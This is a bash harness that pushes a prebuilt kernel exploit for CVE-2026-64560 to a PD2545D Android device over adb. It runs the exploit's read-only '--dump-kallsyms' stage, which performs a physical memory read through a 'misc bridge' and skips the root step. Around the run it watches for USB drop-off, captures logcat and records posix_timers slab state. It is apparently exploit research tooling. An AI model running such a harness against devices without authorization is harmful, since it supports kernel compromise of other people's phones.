#!/usr/bin/env bash
# PD2545D CVE-2026-64560 read-only bridge dump with host-side watch.
#
# Runs the payload's --dump-kallsyms mode (stage0 -> misc bridge -> physical
# read; NO stage8 cred/SELinux/root step) and records exactly when/if the
# device drops off USB. Also captures crash/system logcat while the run is
# alive, so a later analysis can separate a kernel panic from an OOM kill.
#
# Usage:
#   ./tools/pd2545_watch_dump.sh [adb-serial]
#   PD2545_REBOOT=1 ./tools/pd2545_watch_dump.sh [adb-serial]
#
# PD2545_REBOOT=1 reboots the device first (data-safe; clears a polluted
# posix_timers slab baseline left by previous attempts) and waits for boot.
#
# This script never enters --run and never writes userdata.
set -uo pipefail

export MSYS2_ARG_CONV_EXCL='/data'

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
ADB="${ADB:-D:/D-code/tools/android/platform-tools/adb.exe}"
SERIAL="${1:-}"
BIN="$HERE/pd2545-64560/build/cve-2026-64560-pd2545"
REMOTE="/data/local/tmp/cve-2026-64560-pd2545"
LOG_DIR="$HERE/logs"
STAMP="$(date +%Y%m%d-%H%M%S)"
LOG="$LOG_DIR/pd2545-watch-dump-$STAMP.log"
USB_LOG="$LOG_DIR/pd2545-watch-dump-$STAMP.usb.log"
LOGCAT_LOG="$LOG_DIR/pd2545-watch-dump-$STAMP.logcat.txt"

[ -f "$BIN" ] || { echo "missing $BIN (run pd2545-64560/build.sh)" >&2; exit 2; }
[ -x "$ADB" ] || ADB="$ADB.exe"
[ -x "$ADB" ] || { echo "missing adb: $ADB" >&2; exit 2; }
mkdir -p "$LOG_DIR"

adb_() {
    if [ -n "$SERIAL" ]; then "$ADB" -s "$SERIAL" "$@"; else "$ADB" "$@"; fi
}
sh_() { adb_ shell "$@" 2>&1; }

device_line() { adb_ devices | sed -n '2p'; }
device_present() { device_line | grep -qE 'device$|unauthorized|offline'; }

{
    echo "=== PD2545 watch dump $STAMP ==="
    adb_ wait-for-device

    if [ "${PD2545_REBOOT:-0}" = "1" ]; then
        echo "--- reboot to clear slab baseline ---"
        adb_ reboot
        adb_ wait-for-device
        for _ in $(seq 1 120); do
            [ "$(sh_ getprop sys.boot_completed | tr -d '\r')" = "1" ] && break
            sleep 3
        done
        sleep 5
        echo "REBOOT_DONE $(date -Is)"
    fi

    echo "--- pre-run identity/slab ---"
    sh_ 'echo BOOT_ID=$(cat /proc/sys/kernel/random/boot_id); echo UPTIME=$(cut -d. -f1 /proc/uptime)'
    sh_ 'uname -r; uname -v'
    sh_ 'grep posix_timers /proc/slabinfo'
    sh_ 'for f in object_size objs_per_slab order slab_size cpu_partial; do printf "%s=" "$f"; cat /sys/kernel/slab/posix_timers/$f 2>&1; done'
    sh_ 'grep -E "Max pending signals" /proc/self/limits'
    echo "--- binary ---"
    sha256sum "$BIN"

    adb_ push "$BIN" "$REMOTE"
    sh_ "chmod 755 $REMOTE"

    echo "--- start logcat + usb poll ---"
    ( adb_ logcat -b crash -b system -b main -v threadtime >"$LOGCAT_LOG" 2>&1 ) &
    LOGCAT_PID=$!
    ( while :; do printf '%s %s\n' "$(date +%H:%M:%S)" "$(device_line)" >>"$USB_LOG"; sleep 1; done ) &
    USB_PID=$!

    echo "--- payload: --dump-kallsyms (read-only bridge; no stage8) ---"
    adb_ shell "$REMOTE --dump-kallsyms" 2>&1 | tee -a "$LOG"
    rc=${PIPESTATUS[0]}
    echo "RUN_EXIT=$rc" | tee -a "$LOG"
    echo "RUN_END $(date -Is)" | tee -a "$LOG"

    kill "$USB_PID" 2>/dev/null
    kill "$LOGCAT_PID" 2>/dev/null
    wait "$USB_PID" "$LOGCAT_PID" 2>/dev/null

    echo "--- usb trace tail ---" | tee -a "$LOG"
    tail -20 "$USB_LOG" | tee -a "$LOG"

    if ! device_present; then
        echo "DEVICE_LOST $(date -Is)" | tee -a "$LOG"
        echo "waiting up to 10 min for USB/fastboot return..." | tee -a "$LOG"
        for _ in $(seq 1 120); do
            if device_present; then break; fi
            sleep 5
        done
    fi

    if device_present; then
        echo "--- post-run recovery identity ---" | tee -a "$LOG"
        sh_ 'echo BOOT_ID=$(cat /proc/sys/kernel/random/boot_id); echo UPTIME=$(cut -d. -f1 /proc/uptime); getprop ro.boot.bootreason; getprop sys.boot.reason' | tee -a "$LOG"
        sh_ 'ls -l /sys/fs/pstore 2>&1 | head -10; head -c 4096 /proc/last_kmsg 2>&1 | head -20' | tee -a "$LOG"
        sh_ 'grep posix_timers /proc/slabinfo' | tee -a "$LOG"
        {
            echo "--- logcat crash tail ---"
            tail -200 "$LOGCAT_LOG"
        } | tee -a "$LOG"
        echo "DEVICE_BACK_AFTER_RUN $(date -Is)" | tee -a "$LOG"
    else
        echo "DEVICE_NOT_BACK_AFTER_10MIN $(date -Is)" | tee -a "$LOG"
    fi
    echo "=== done ==="
} 2>&1 | tee -a "$LOG"

echo
echo "log:    $LOG"
echo "usb:    $USB_LOG"
echo "logcat: $LOGCAT_LOG"
